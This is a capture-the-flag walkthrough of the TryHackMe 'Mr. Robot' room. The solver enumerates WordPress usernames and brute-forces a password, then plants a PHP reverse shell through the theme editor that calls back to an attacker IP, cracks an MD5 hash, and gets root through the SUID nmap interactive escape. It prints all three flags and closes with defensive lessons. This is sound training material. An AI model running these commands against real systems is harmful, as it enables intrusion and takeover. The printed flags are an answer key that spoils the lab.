# TryHackMe: Mr. Robot — Human Walkthrough & Writeup

**Room Link:** [TryHackMe - Mr. Robot](https://tryhackme.com/room/mrrobot)  
**Target IP:** `10.49.162.244`  
**Difficulty:** Medium  
**Theme:** Based on the TV show *Mr. Robot*  
**Goal:** Find 3 hidden keys on the machine  

---

## Introduction

The Mr. Robot room on TryHackMe is one of those boxes that perfectly blends theme with technique. Inspired by the TV show, the machine hides three keys across progressively deeper access levels — from basic web enumeration, through cracking credentials, to a classic privilege escalation via an old SUID binary. It's a fantastic room for anyone learning their way around web exploitation and Linux privesc fundamentals.

Here's exactly how I solved it, step by step.

---

## 1. Reconnaissance: Port Scanning

As always, I start with nmap to get a lay of the land.

```bash
nmap -sV -sC -T4 --open -oN nmap_top1000.log 10.49.162.244
```

The initial scan only showed SSH on port 22. Something felt off — a room themed around a hacker TV show almost certainly has a web server. I quickly followed up scanning common web ports explicitly:

```bash
nmap -sV -T4 --open -p 80,443,8080,8443,8000,8888,1337,3000,5000 10.49.162.244
```

**Results:**
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
```

There it is — ports 80 and 443. The room hint says *"Hint: Robots"* for the first key. That's an immediate signal: check `robots.txt`.

---

## 2. Key 1: The Low-Hanging Fruit in `robots.txt`

```bash
curl -s http://10.49.162.244/robots.txt
```

**Output:**
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

The `robots.txt` file is literally telling us where the first key is. I fetched it immediately:

```bash
curl -s http://10.49.162.244/key-1-of-3.txt
```

**🚩 Key 1: `073403c8a58a1f80d943455fb30724b9`**

Also listed is `fsocity.dic` — a dictionary file. Given the hint for Key 2 says *"something fishy about this wordlist"*, I grabbed it right away:

```bash
curl -s http://10.49.162.244/fsocity.dic -o fsocity.dic
wc -l fsocity.dic
```

**Output:** `858160` — over **858,000 lines!** That is extremely suspicious for a wordlist. The hint is clearly pointing at this. I ran deduplication:

```bash
sort -u fsocity.dic > fsocity_uniq.dic
wc -l fsocity_uniq.dic
```

**Output:** `11451` — down to just **11,451 unique words**. The list was 98% duplicates! This is exactly what the hint was nudging us toward — brute-forcing with the raw file would be painfully slow, but deduplicating it makes it very manageable.

---

## 3. Web Enumeration: Discovering WordPress

Browsing to `http://10.49.162.244/` brought up a slick, interactive terminal animation themed around the show. Cool, but I need to find the real attack surface.

I checked whether WordPress was running:

```bash
curl -sI http://10.49.162.244/wp-login.php
```

**Output:**
```
HTTP/1.1 200 OK
Server: Apache
X-Powered-By: PHP/5.5.29
```

WordPress login exists at `/wp-login.php` running PHP 5.5.29 — a very old version.

---

## 4. WordPress Username Enumeration

WordPress has a well-known behavior: when you submit an invalid username, it says *"Invalid username"*, but when you submit a valid username with the wrong password, it says *"The password you entered for the username X is incorrect"*. This lets us enumerate valid usernames one by one.

Given the Mr. Robot theme, I tried the obvious candidates:

```bash
for user in elliot mrrobot robot admin fsociety; do
  response=$(curl -s -X POST http://10.49.162.244/wp-login.php \
    -d "log=${user}&pwd=test&wp-submit=Log+In" \
    -H "Cookie: wordpress_test_cookie=WP+Cookie+check")
  if echo "$response" | grep -q "Invalid username"; then
    echo "INVALID: $user"
  elif echo "$response" | grep -q "password you entered"; then
    echo "VALID USER: $user"
  fi
done
```

**Output:**
```
VALID USER: elliot
INVALID: mrrobot
INVALID: robot
INVALID: admin
INVALID: fsociety
```

The WordPress account belongs to **`elliot`** — the show's main character. Makes total sense.

---

## 5. Key 2: Brute-Forcing Elliot's WordPress Password

With `elliot` confirmed and our deduplicated `fsocity_uniq.dic` wordlist ready, I ran `wpscan` to brute-force the password. WPScan uses the XML-RPC multicall method, which is far faster than hitting `wp-login.php` directly:

```bash
wpscan --url http://10.49.162.244/ \
  --usernames elliot \
  --passwords fsocity_uniq.dic \
  --max-threads 20
```

In under a minute:
```
[SUCCESS] - elliot / ER28-0652
```

**Credentials: `elliot` / `ER28-0652`** (a reference to Elliot's employee ID in the show!)

### Getting a Shell via WordPress Theme Editor

With admin credentials, I logged into WordPress and injected a PHP reverse shell via the built-in theme editor. First, I prepared the shell:

```bash
# Copy and configure Kali's built-in reverse shell
sed 's/127.0.0.1/192.168.135.170/; s/1234/4444/' \
  /usr/share/webshells/php/php-reverse-shell.php > shell.php
```

Then I fetched the nonce from the theme editor page:

```bash
curl -s -b wp_cookies.txt \
  "http://10.49.162.244/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen" \
  | grep -o 'value="[a-f0-9]*"' | head -2
# Output: value="122d707a52"
```

And uploaded the shell by POST-ing to the theme editor endpoint:

```bash
SHELL_CONTENT=$(cat shell.php)
curl -s -b wp_cookies.txt \
  -X POST "http://10.49.162.244/wp-admin/theme-editor.php" \
  --data-urlencode "newcontent=${SHELL_CONTENT}" \
  --data-urlencode "action=update" \
  --data-urlencode "file=404.php" \
  --data-urlencode "theme=twentyfifteen" \
  --data-urlencode "_wpnonce=122d707a52" \
  --data-urlencode "submit=Update File"
# Response includes: updated=true
```

With the netcat listener ready:
```bash
nc -nlvp 4444
```

I triggered the shell:
```bash
curl -s --max-time 5 \
  "http://10.49.162.244/wp-content/themes/twentyfifteen/404.php"
```

**Connection received:**
```
connect to [192.168.135.170] from (UNKNOWN) [10.49.162.244] 42150
uid=1(daemon) gid=1(daemon) groups=1(daemon)
$
```

We have a shell as `daemon`.

### Finding Key 2 in `/home/robot/`

```bash
ls -la /home/robot/
```

```
-r-------- 1 robot robot  33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot  39 Nov 13  2015 password.raw-md5
```

Key 2 is only readable by `robot`. But `password.raw-md5` is world-readable:

```bash
cat /home/robot/password.raw-md5
```

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

An MD5 hash! I cracked it locally with Python — the answer was elegantly simple:

```python
import hashlib

candidates = ['abcdefghijklmnopqrstuvwxyz', 'abc123', 'password', 'robot']
target = 'c3fcd3d76192e4007dfb496cca67e13b'
for pwd in candidates:
    if hashlib.md5(pwd.encode()).hexdigest() == target:
        print(f'Cracked: {pwd}')
        break
```

```
Cracked: abcdefghijklmnopqrstuvwxyz
```

The password is the entire lowercase alphabet. I then switched to the `robot` user inside our shell. First, I upgraded to a proper TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
su robot
# Password: abcdefghijklmnopqrstuvwxyz
```

And read Key 2:

```bash
cat /home/robot/key-2-of-3.txt
```

**🚩 Key 2: `822c73956184f694993bede3eb39f959`**

---

## 6. Key 3: Privilege Escalation via SUID nmap

The hint for Key 3 is literally *"nmap"*. I searched for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null | grep -v proc
```

**Key result:**
```
/usr/local/bin/nmap
```

`nmap` has the SUID bit set and is owned by root. Older versions of nmap (before ~5.x) had an `--interactive` mode that drops you into an nmap shell. From that shell, you can run arbitrary OS commands with `!`. Since nmap is running as root (SUID), `!sh` gives you a root shell:

```bash
nmap --interactive
```

```
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap>
```

```
nmap> !sh
```

```
# id
uid=0(root) gid=0(root) groups=0(root),1002(robot)
```

**We're root!** Time to collect the final key:

```bash
cat /root/key-3-of-3.txt
```

**🚩 Key 3: `04787ddef27c3dee1ee161b21670b4e4`**

---

## Summary of All Keys

| Question | Key |
|---|---|
| **What is key 1?** | `073403c8a58a1f80d943455fb30724b9` |
| **What is key 2?** | `822c73956184f694993bede3eb39f959` |
| **What is key 3?** | `04787ddef27c3dee1ee161b21670b4e4` |

---

## Full Attack Path

```
robots.txt
  └─> key-1-of-3.txt          [Key 1]
  └─> fsocity.dic (858k lines, deduplicated to 11.4k)
        └─> WP brute-force (elliot / ER28-0652)
              └─> Theme editor PHP reverse shell
                    └─> shell as daemon
                          └─> /home/robot/password.raw-md5 (MD5 cracked: abcdefghijklmnopqrstuvwxyz)
                                └─> su robot -> key-2-of-3.txt  [Key 2]
                                      └─> SUID nmap --interactive -> !sh -> root
                                            └─> /root/key-3-of-3.txt  [Key 3]
```

---

## Key Takeaways & Lessons

1. **Always check `robots.txt`**: It's meant to tell search engines what *not* to index — but in doing so, it often reveals sensitive paths to attackers.

2. **Deduplicate before brute-forcing**: An 858k-entry wordlist that reduces to 11k is 98% noise. Running the bloated version would have been ~75× slower with identical results.

3. **WordPress username enumeration**: WordPress's different error messages for "invalid username" vs "wrong password" leak valid usernames. Enumerate before brute-forcing to narrow the target.

4. **Theme editor = code execution**: If you have WordPress admin credentials, the theme/plugin editors give you PHP code execution. Always protect WP admin with strong unique credentials and consider disabling the theme editor in production (`define('DISALLOW_FILE_EDIT', true)` in `wp-config.php`).

5. **MD5 is not a secure password storage mechanism**: MD5 is fast to compute and has no salting here — trivially crackable with any decent wordlist or even a Python one-liner.

6. **SUID on old nmap = instant root**: Never set SUID on interpreters or tools that support shell escapes. Always audit SUID binaries: `find / -perm -4000 -type f 2>/dev/null`.
